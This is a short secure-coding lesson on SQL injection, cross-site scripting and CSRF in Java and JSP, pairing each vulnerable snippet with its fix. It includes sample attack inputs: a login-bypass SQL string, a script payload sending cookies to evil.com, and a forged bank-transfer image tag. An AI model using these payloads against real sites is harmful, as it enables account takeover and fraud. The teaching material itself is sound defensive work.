---
type: "THEORY"
title: "Common Attack Patterns"
---

Understanding attacks helps you defend:

SQL INJECTION:
// Vulnerable
String query = "SELECT * FROM users WHERE name = '" + userInput + "'";
// Input: ' OR '1'='1' --
// Result: SELECT * FROM users WHERE name = '' OR '1'='1' --'
// Returns ALL users!

FIX: Use parameterized queries
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE name = ?");
ps.setString(1, userInput);  // Safely escaped

CROSS-SITE SCRIPTING (XSS):
// Vulnerable
<p>Welcome, ${username}</p>
// Input: <script>document.location='evil.com?c='+document.cookie</script>
// Result: Steals cookies!

FIX: Encode output
<p>Welcome, ${fn:escapeXml(username)}</p>

CROSS-SITE REQUEST FORGERY (CSRF):
// Attacker's site has:
<img src="https://yourbank.com/transfer?to=attacker&amount=10000">
// Victim's browser sends request with their cookies!

FIX: CSRF tokens (covered in session lesson)